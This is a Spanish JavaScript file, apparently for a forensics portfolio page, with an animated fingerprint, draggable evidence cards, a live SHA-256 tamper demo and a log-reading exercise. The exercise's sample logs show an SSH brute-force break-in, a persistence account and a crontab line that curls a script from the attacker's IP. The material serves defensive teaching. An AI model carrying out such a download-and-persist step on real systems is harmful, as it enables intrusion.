/* Portfolio: huella dibujada, pruebas que se mueven, filtro, SHA-256 real y aparición al hacer scroll */
document.documentElement.classList.add("js");

const reducido = matchMedia("(prefers-reduced-motion: reduce)").matches;
const NS = "http://www.w3.org/2000/svg";

/* ---------- Huella dactilar: arcos que se dibujan al cargar ---------- */
const huella = document.getElementById("huella");
for (let i = 0; i < 17; i++) {
  const r = 14 + i * 12;
  const hueco = 0.1 + ((i * 37) % 11) * 0.11;          // cada línea se corta por un sitio distinto
  const punto = (a) => {
    const onda = 1 + 0.035 * Math.sin(3 * a + i * 0.35) + 0.02 * Math.sin(5 * a - i * 0.2);
    return `${(200 + Math.cos(a) * r * onda).toFixed(1)} ${(270 + Math.sin(a) * r * 1.22 * onda).toFixed(1)}`;
  };
  // Dos o tres tramos por línea, separados por cortes pequeños, como las crestas reales
  const tramos = i % 3 === 0 ? 3 : 2;
  for (let t = 0; t < tramos; t++) {
    const ini = hueco + (t / tramos) * Math.PI * 2 + 0.07;
    const fin = hueco + ((t + 1) / tramos) * Math.PI * 2 - 0.07;
    let d = `M ${punto(ini)}`;
    for (let a = ini + 0.08; a < fin; a += 0.08) d += ` L ${punto(a)}`;
    const arco = document.createElementNS(NS, "path");
    arco.setAttribute("d", d);
    huella.appendChild(arco);
    if (!reducido) {
      const largo = arco.getTotalLength();
      arco.style.strokeDasharray = largo;
      arco.animate([{ strokeDashoffset: largo }, { strokeDashoffset: 0 }], { duration: 1100, delay: i * 45, easing: "ease-out", fill: "backwards" });
    }
  }
}

/* ---------- Barra de progreso en la cinta ---------- */
const progreso = document.getElementById("progreso");
function medirProgreso() {
  const total = document.documentElement.scrollHeight - innerHeight;
  progreso.style.transform = `scaleX(${total > 0 ? Math.min(scrollY / total, 1) : 0})`;
}
addEventListener("scroll", medirProgreso, { passive: true });
addEventListener("resize", medirProgreso);
medirProgreso();

/* ---------- Pruebas: inclinación, filtro y arrastre con ratón ---------- */
const pruebas = document.querySelectorAll(".prueba");
pruebas.forEach((p, i) => p.style.setProperty("--giro", `${[-1.6, 1.2, -0.7, 1.7, -1.1, 0.8, -1.4][i % 7]}deg`));

const filtros = document.querySelectorAll(".filtros button");
filtros.forEach((b) => b.addEventListener("click", () => {
  filtros.forEach((o) => { o.classList.toggle("activo", o === b); o.setAttribute("aria-pressed", String(o === b)); });
  pruebas.forEach((p) => {
    p.hidden = b.dataset.f !== "todas" && p.dataset.o !== b.dataset.f;
    p.style.removeProperty("--x");
    p.style.removeProperty("--y");
  });
}));

if (matchMedia("(hover: hover) and (pointer: fine)").matches) {
  pruebas.forEach((p) => {
    let x = 0, y = 0, ix = 0, iy = 0;
    p.addEventListener("pointerdown", (e) => {
      x = parseFloat(p.style.getPropertyValue("--x")) || 0;
      y = parseFloat(p.style.getPropertyValue("--y")) || 0;
      ix = e.clientX; iy = e.clientY;
      p.setPointerCapture(e.pointerId);
      p.classList.add("moviendo");
    });
    p.addEventListener("pointermove", (e) => {
      if (!p.classList.contains("moviendo")) return;
      p.style.setProperty("--x", `${x + e.clientX - ix}px`);
      p.style.setProperty("--y", `${y + e.clientY - iy}px`);
    });
    const soltar = () => p.classList.remove("moviendo");
    p.addEventListener("pointerup", soltar);
    p.addEventListener("pointercancel", soltar);
  });
}

/* ---------- Sello: SHA-256 real con la API del navegador ---------- */
const entradaHash = document.getElementById("texto-hash");
const salidaHash = document.getElementById("hash");
async function sellar() {
  if (!crypto.subtle) { salidaHash.textContent = "Tu navegador no permite calcularla aquí."; return; }
  const valor = entradaHash.value;
  const datos = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(valor));
  if (valor !== entradaHash.value) return; // ya se ha escrito otra cosa
  const huellaHex = [...new Uint8Array(datos)].map((b) => b.toString(16).padStart(2, "0")).join("");
  huellaOriginal ??= huellaHex;
  // Resalta cada carácter que no coincide con la huella del texto original
  let distintos = 0;
  salidaHash.replaceChildren(...[...huellaHex].map((c, i) => {
    const s = document.createElement("span");
    s.textContent = c;
    if (c !== huellaOriginal[i]) { s.className = "cambia"; distintos++; }
    return s;
  }));
  cambios.textContent = distintos
    ? `${distintos} de 64 caracteres son distintos a los de la huella original.`
    : "Coincide con la huella original: la prueba está intacta.";
}
const cambios = document.getElementById("cambios");
const textoOriginal = entradaHash.value;
let huellaOriginal = null;
entradaHash.addEventListener("input", sellar);
document.getElementById("restaurar").addEventListener("click", () => { entradaHash.value = textoOriginal; sellar(); });
sellar();

/* ---------- Caso simulado: marcar las líneas del ataque ---------- */
const LINEAS = [
  { t: "08:58:12  sshd  Accepted password for ana from 192.168.1.20", ataque: false, nota: "Normal: acceso desde la red interna." },
  { t: "09:14:02  sshd  Failed password for root from 203.0.113.45", ataque: true, nota: "Prueba contraseñas desde una IP externa." },
  { t: "09:14:04  sshd  Failed password for admin from 203.0.113.45", ataque: true, nota: "Misma IP, dos segundos después: no parece una persona." },
  { t: "09:14:06  sshd  Failed password for admin from 203.0.113.45", ataque: true, nota: "Sigue el ataque de fuerza bruta." },
  { t: "09:14:31  sshd  Accepted password for admin from 203.0.113.45", ataque: true, nota: "La clave: la misma IP consigue entrar." },
  { t: "09:15:10  sudo  admin : COMMAND=/usr/sbin/useradd soporte2", ataque: true, nota: "Crea un usuario para conservar el acceso." },
  { t: "09:16:48  crontab  admin : añade tarea, curl http://203.0.113.45/s.sh", ataque: true, nota: "Programa una descarga desde la IP atacante." },
  { t: "09:20:00  CRON  root : ejecuta /usr/local/bin/copia-seguridad.sh", ataque: false, nota: "Normal: copia de seguridad programada." },
  { t: "09:31:22  sshd  Failed password for ana from 192.168.1.20", ataque: false, nota: "Un solo fallo desde la red interna." },
  { t: "09:31:29  sshd  Accepted password for ana from 192.168.1.20", ataque: false, nota: "Normal: ana entra a la segunda." }
];
const registro = document.getElementById("registro");
const cerrarCaso = document.getElementById("cerrar-caso");
const reabrirCaso = document.getElementById("reabrir-caso");
const cuenta = document.getElementById("cuenta");
const veredicto = document.getElementById("veredicto");
const notaVeredicto = document.getElementById("veredicto-nota");

const botonesLinea = LINEAS.map((linea) => {
  const li = document.createElement("li");
  const b = document.createElement("button");
  b.type = "button";
  b.textContent = linea.t;
  b.setAttribute("aria-pressed", "false");
  b.addEventListener("click", () => {
    b.setAttribute("aria-pressed", String(b.getAttribute("aria-pressed") !== "true"));
    const n = botonesLinea.filter((o) => o.getAttribute("aria-pressed") === "true").length;
    cuenta.textContent = `${n} ${n === 1 ? "línea marcada" : "líneas marcadas"}`;
  });
  const nota = document.createElement("p");
  nota.className = "registro__nota";
  nota.hidden = true;
  nota.textContent = linea.nota;
  li.append(b, nota);
  registro.appendChild(li);
  return b;
});

cerrarCaso.addEventListener("click", () => {
  let aciertos = 0, falsos = 0;
  const reales = LINEAS.filter((l) => l.ataque).length;
  botonesLinea.forEach((b, i) => {
    const marcada = b.getAttribute("aria-pressed") === "true";
    if (marcada && LINEAS[i].ataque) aciertos++;
    if (marcada && !LINEAS[i].ataque) falsos++;
    b.disabled = true;
    b.parentElement.classList.add(LINEAS[i].ataque ? "es-ataque" : "es-normal");
    if (marcada !== LINEAS[i].ataque) b.parentElement.classList.add("fallo");
    b.nextElementSibling.hidden = false;
  });
  const perfecto = aciertos === reales && falsos === 0;
  notaVeredicto.textContent = perfecto
    ? `Caso resuelto: encontraste las ${reales} líneas del ataque, sin falsas alarmas.`
    : `Has encontrado ${aciertos} de ${reales} líneas del ataque y ${falsos === 1 ? "1 falsa alarma" : `${falsos} falsas alarmas`}. Las líneas con borde discontinuo son las que cambiarían tu respuesta.`;
  veredicto.hidden = false;
  cerrarCaso.hidden = true;
  reabrirCaso.hidden = false;
  veredicto.focus({ preventScroll: true });
  veredicto.scrollIntoView({ block: "nearest", behavior: reducido ? "auto" : "smooth" });
});

reabrirCaso.addEventListener("click", () => {
  botonesLinea.forEach((b) => {
    b.disabled = false;
    b.setAttribute("aria-pressed", "false");
    b.parentElement.className = "";
    b.nextElementSibling.hidden = true;
  });
  cuenta.textContent = "0 líneas marcadas";
  veredicto.hidden = true;
  reabrirCaso.hidden = true;
  cerrarCaso.hidden = false;
  cerrarCaso.focus();
});

document.getElementById("imprimir").addEventListener("click", () => print());

/* ---------- Aparición al entrar en pantalla ---------- */
const aparecen = document.querySelectorAll(".aparece");
if (reducido || !("IntersectionObserver" in window)) {
  aparecen.forEach((a) => a.classList.add("visto"));
} else {
  const vigia = new IntersectionObserver((entradas) => {
    entradas.forEach((e) => { if (e.isIntersecting) { e.target.classList.add("visto"); vigia.unobserve(e.target); } });
  }, { threshold: 0.15 });
  aparecen.forEach((a) => vigia.observe(a));
}
